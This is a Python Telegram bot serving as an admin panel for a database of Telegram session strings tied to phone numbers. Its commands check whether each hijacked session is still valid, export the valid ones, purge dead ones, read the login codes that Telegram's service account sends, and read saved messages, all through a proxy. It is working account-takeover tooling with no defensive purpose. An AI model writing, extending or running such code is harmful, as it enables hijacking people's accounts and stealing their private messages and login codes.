import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest
from phonenumbers import parse, geocoder

# Load env
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    if not sessions:
        await message.answer("❌ Нет сессий в базе данных.")
        return

    await message.answer("🔍 Проверка всех сессий...")

    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            auth = await client.is_user_authorized()
            if not auth:
                results.append(f"❌ {phone} — невалид")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(
                    f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}"
                )
        except Exception as e:
            results.append(f"❌ {phone} — ошибка: {e}")
        finally:
            await client.disconnect()

    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['loger'])
async def cmd_loger(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    valid_sessions = []

    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append({"phone": phone, "session": session_str})
        except:
            pass
        finally:
            await client.disconnect()

    if not valid_sessions:
        await message.answer("❌ Нет валидных сессий.")
        return

    with open("valid_sessions.txt", "w") as f:
        json.dump(valid_sessions, f, indent=2)

    await message.answer_document(open("valid_sessions.txt", "rb"))

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    deleted = 0

    for session in sessions:
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
        return

    session = sessions_col.find_one({"phone": args})
    if not session:
        await message.reply("❌ Сессия с этим номером не найдена.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(
            peer=777000,
            limit=1,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))

        if history.messages:
            text = history.messages[0].message
            await message.reply(f"📨 Последний код от Telegram:\n\n`{text}`", parse_mode="Markdown")
        else:
            await message.reply("⚠️ Нет сообщений от Telegram (777000).")

    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

@dp.message_handler(commands=['fa'])
async def cmd_fa(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
        return

    session = sessions_col.find_one({"phone": args})
    if not session:
        await message.reply("❌ Сессия с этим номером не найдена.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        me = await client.get_me()
        history = await client(GetHistoryRequest(
            peer=me.id,
            limit=5,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))

        if not history.messages:
            await message.reply("⚠️ Нет исходящих сообщений.")
            return

        output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages])
        await message.reply(f"📤 Последние сообщения:\n\n{output}")

    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
